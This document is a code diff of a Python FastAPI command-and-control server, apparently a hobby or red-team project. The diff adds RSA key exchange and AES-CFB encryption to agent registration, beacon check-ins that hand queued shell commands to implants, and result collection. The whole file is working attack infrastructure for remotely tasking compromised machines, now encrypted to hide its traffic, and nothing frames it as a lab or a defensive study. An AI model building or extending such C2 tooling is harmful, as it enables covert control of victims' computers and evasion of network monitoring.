@@ -1,6 +1,11 @@
 import uvicorn
+import base64
+import os
 from fastapi import FastAPI, Request
 from contextlib import asynccontextmanager
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import AES, PKCS1_OAEP
+from Crypto.Random import get_random_bytes
 
 from database import (
     init_db,
@@ -10,105 +15,147 @@ from database import (
 )
 
 # -------------------------
+# Generate RSA Keys
+# -------------------------
+key = RSA.generate(2048)
+private_key = key
+public_key = key.publickey()
+
+rsa_decryptor = PKCS1_OAEP.new(private_key)
+
+# Session keys per agent
+sessions = {}
+
+tasks = []
+
+# -------------------------
 # Startup
 # -------------------------
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    print("[*] Starting C2 Server...")
+    print("[*] Starting encrypted C2...")
     init_db()
     yield
-    print("[*] Shutting down C2 Server...")
 
 app = FastAPI(lifespan=lifespan)
 
-# In-memory task storage
-tasks = []
 
 # -------------------------
-# Register Agent
+# Provide public key
+# -------------------------
+@app.get("/pubkey")
+def get_pubkey():
+    return {
+        "key": public_key.export_key().decode()
+    }
+
+
+# -------------------------
+# Register agent
 # -------------------------
 @app.post("/register")
 async def register(request: Request):
     data = await request.json()
-    agent_id = register_agent(data)
 
-    print(f"[+] Agent Registered: {agent_id}")
+    encrypted_key = base64.b64decode(data["key"])
+    aes_key = rsa_decryptor.decrypt(encrypted_key)
+
+    agent_info = data["info"]
+
+    agent_id = register_agent(agent_info)
+    sessions[agent_id] = aes_key
+
+    print(f"[+] Encrypted session established: {agent_id}")
+
     return {"agent_id": agent_id}
 
 
 # -------------------------
-# Beacon (Agent check-in)
+# Decrypt helper
+# -------------------------
+def decrypt_message(agent_id, payload):
+    aes_key = sessions[agent_id]
+
+    raw = base64.b64decode(payload)
+    iv = raw[:16]
+    ciphertext = raw[16:]
+
+    cipher = AES.new(aes_key, AES.MODE_CFB, iv=iv)
+    return cipher.decrypt(ciphertext).decode()
+
+
+# -------------------------
+# Encrypt helper
+# -------------------------
+def encrypt_message(agent_id, message):
+    aes_key = sessions[agent_id]
+
+    iv = get_random_bytes(16)
+    cipher = AES.new(aes_key, AES.MODE_CFB, iv=iv)
+
+    encrypted = iv + cipher.encrypt(message.encode())
+    return base64.b64encode(encrypted).decode()
+
+
+# -------------------------
+# Beacon
 # -------------------------
 @app.post("/beacon/{agent_id}")
-def beacon(agent_id: str):
+async def beacon(agent_id: str, request: Request):
     update_last_seen(agent_id)
+
+    data = await request.json()
+
+    decrypted = decrypt_message(agent_id, data["data"])
+
+    # optional padding removal
+    if "|" in decrypted:
+        decrypted = decrypted.split("|")[0]
 
     for task in tasks:
         if task["agent_id"] == agent_id and task["status"] == "pending":
             task["status"] = "sent"
-            print(f"[>] Sending task to {agent_id}: {task['command']}")
-            return {"task": task["command"]}
+
+            encrypted_task = encrypt_message(agent_id, task["command"])
+            return {"task": encrypted_task}
 
     return {"task": None}
 
 
 # -------------------------
-# Receive command result
+# Receive result
 # -------------------------
 @app.post("/result/{agent_id}")
-def receive_result(agent_id: str, data: dict):
-    command = data.get("command")
-    output = data.get("output")
+async def receive_result(agent_id: str, request: Request):
+    data = await request.json()
 
-    for task in tasks:
-        if task["agent_id"] == agent_id and task["command"] == command:
-            task["status"] = "completed"
-            task["result"] = output
+    decrypted = decrypt_message(agent_id, data["data"])
 
     print(f"[+] Result from {agent_id}")
-    print(output)
+    print(decrypted)
 
-    return {"status": "stored"}
+    return {"status": "ok"}
 
 
 # -------------------------
-# Create task (operator)
+# Create task
 # -------------------------
 @app.post("/task/{agent_id}")
 def create_task(agent_id: str, data: dict):
-    command = data.get("command")
-
     task = {
         "agent_id": agent_id,
-        "command": command,
-        "status": "pending",
-        "result": None
+        "command": data["command"],
+        "status": "pending"
     }
 
     tasks.append(task)
-
-    print(f"[+] Task added for {agent_id}: {command}")
-    return {"message": "Task queued"}
+    return {"message": "queued"}
 
 
-# -------------------------
-# List agents
-# -------------------------
 @app.get("/agents")
-def list_agents():
+def agents():
     return get_all_agents()
 
 
-# -------------------------
-# View tasks
-# -------------------------
-@app.get("/tasks")
-def list_tasks():
-    return tasks
-
-
-# -------------------------
-# Run server
-# -------------------------
 if __name__ == "__main__":
     uvicorn.run("main:app", host="127.0.0.1", port=8000, reload=True)
